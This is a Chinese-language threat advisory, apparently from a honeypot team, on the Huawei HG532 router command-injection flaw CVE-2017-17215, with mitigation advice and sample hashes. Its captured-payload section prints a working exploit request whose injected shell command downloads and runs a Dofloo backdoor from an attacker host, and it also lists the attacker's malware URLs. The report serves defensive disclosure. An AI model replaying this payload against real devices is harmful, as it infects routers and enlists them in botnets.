---
layout:     post
title:      华为路由器远程代码执行漏洞（CVE-2017-17215）通报
subtitle:   CVE-2017-17215
date: 2018-08-20
author:     shenzhen_antiylabs
header-img: img/avatar-by.jpg
catalog: true
tags:
    - honeypot_event
---

# 华为路由器远程代码执行漏洞（CVE-2017-17215）通报

## 概述

2017年11月27日Check Point 公司报告了一个华为 HG532 系列路由器的远程命令执行漏洞，漏洞编号为CVE-2017-17215。利用该漏洞，向路由器UPnP服务监听的37215端口发送一个特殊构造的 HTTP 请求包，即可触发命令执行。此端口在默认配置下并不能从外网访问，但由于该系列路由器数量极其巨大，所以互联网上仍有较多可访问到该端口的设备存在。

2018年7月4日，安天蜜网捕获到利用华为路由器远程代码执行漏洞（CVE-2017-17215）的攻击流量，并关联到一个HFS站点，监控到里面有zeroshell工具，利用Zeroshell 3.6.0/3.7.0 Net Services - Remote Code Execution漏洞进行传播，HFS站点地址为：http://118.193.233.8:4780/。

## 漏洞描述

华为 HG532 系列路由器是一款为家庭和小型办公用户打造的高速无线路由器产品。

华为网关应用了UPnP（通用即插即用）协议，通过TR-064及技术标准，UPnP被广泛用于家用和企业用的嵌入式设备。TR-064用于本地网络配置，比如工程师可以进行基本的设备配置，固件升级等。但是，华为使用TR-064时，通过37215端口暴露给了互联网。

从设备的UPnP描述来看，它支持DeviceUpgrade服务，这种服务是通过发送请求给/ctrlt/DeviceUpgrade_1来实现固件升级的，还通过NewStatusURL和NewDownloadURL两个元素实现。

漏洞允许远程注入shell 元字符到NewStatusURL和NewDownloadURL中来执行难任意代码。

## 捕获载荷

```
POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\n
Host: 39.108.82.120:37215\r\n
File Data: 464 bytes
HTTP request 1/1
Content length: 464
Length: 464
Request Version: HTTP/1.1
Request Method: POST
User-Agent: python-requests/2.7.0 CPython/2.7.15 Windows/2003Server\r\n
Data: 3c3f786d6c2076657273696f6e3d22312e3022203f3e0a20...
Connection: keep-alive\r\n
Expert Info (Chat/Sequence): POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\n
Accept-Encoding: gzip, deflate\r\n
Full request URI: http://39.108.82.120:37215/ctrlt/DeviceUpgrade_1
Accept: */*\r\n
Group: Sequence
Severity level: Chat
data: 3c3f786d6c2076657273696f6e3d22312e3022203f3e0a202020203c733a456e76656c6f706520786d6c6e733a733d22687474703a2f2f736368656d61732e786d6c736f61702e6f72672f736f61702f656e76656c6f70652f2220733a656e636f64696e675374796c653d22687474703a2f2f736368656d61732e786d6c736f61702e6f72672f736f61702f656e636f64696e672f223e0a202020203c733a426f64793e3c753a5570677261646520786d6c6e733a753d2275726e3a736368656d61732d75706e702d6f72673a736572766963653a57414e505050436f6e6e656374696f6e3a31223e0a202020203c4e657753746174757355524c3e24286364202f746d702626207767657420687474703a2f2f3131382e3139332e3233332e383a343738302f6c696e75782d6d6970736c656926262063686d6f64202b78206c696e75782d6d6970736c65692626202e2f6c696e75782d6d6970736c6569293c2f4e657753746174757355524c3e0a3c4e6577446f776e6c6f616455524c3e24286563686f2048554157454955504e50293c2f4e6577446f776e6c6f616455524c3e0a3c2f753a557067726164653e0a202020203c2f733a426f64793e0a202020203c2f733a456e76656c6f70653e
Request URI: /ctrlt/DeviceUpgrade_1
POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\n
Content-Length: 464\r\n
\r\n 
attack_data:<?xml version="1.0" ?>\xa    <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\xa    <s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">\xa    <NewStatusURL>$(cd /tmp&& wget  http://118.193.233.8:4780/linux-mipslei&& chmod +x linux-mipslei&& ./linux-mipslei)</NewStatusURL>\xa<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\xa</u:Upgrade>\xa    </s:Body>\xa    </s:Envelope>

```

## 	攻击IP及URL

http://118.193.233.8:4780/dd-wrtlei

http://118.193.233.8:4780/linux2.4lei

http://118.193.233.8:4780/linux2.6lei

http://118.193.233.8:4780/linux-armlei

http://118.193.233.8:4780/linux-mipslei

http://118.193.233.8:4780/immm.exe

## 样本



| 文件名 | 病毒家族 | Hash |
| ------ | -------- | ---- |
|        |          |      |

| dd-wrtlei                 | Trojan[Backdoor]/Linux.Dofloo  | 411327ac98f156a446df3556bb29a05a |
| ------------------------- | ------------------------------ | -------------------------------- |
| Linux2.4lei               | Trojan[Backdoor]/Linux.Dofloo  | 148e9ea2bf1a6e873baec19130b52050 |
| Linux2.6lei               | Trojan[Backdoor]/Linux.Dofloo  | aeffdae8ccb7c86d3868369781b70e14 |
| linux-armlei              | Trojan[Backdoor]/Linux.Dofloo  | 62ef30a8fa91297c2657bc34c3824075 |
| linux-mipslei             | Trojan[Backdoor]/Linux.Dofloo  | d40086b072a5d66d590ecfc18d758618 |
| immm.exe                  | Trojan[DDoS]/Win32.Nitol       | b3ff1a7a453756532ba7dcf1da7f310e |
| 2.txt                     | 存在CVE-2017-17215漏洞的IP列表 |                                  |
| 2018年4月最新内核3306.zip | 3306爆破工具                   |                                  |
| Zeroshell.zar             | 传马工具                       |                                  |

  

## 受影响范围



华为HG532路由器





## 修复及防护建议



2017年11月30日，华为官方发布了安全公告，确认了该漏洞。 公告中提到了以下漏洞缓解措施：

- 配置路由器内置的防火墙
- 更改路由器默认密码
- 在路由器外部署防火墙
- 升级到最新固件



## 参考资料



[1]     华为安全公告

http://www.huawei.com/en/psirt/security-notices/huawei-sn-20171130-01-hg532-en

[2]     Check Point 漏洞报告

https://research.checkpoint.com/good-zero-day-skiddie/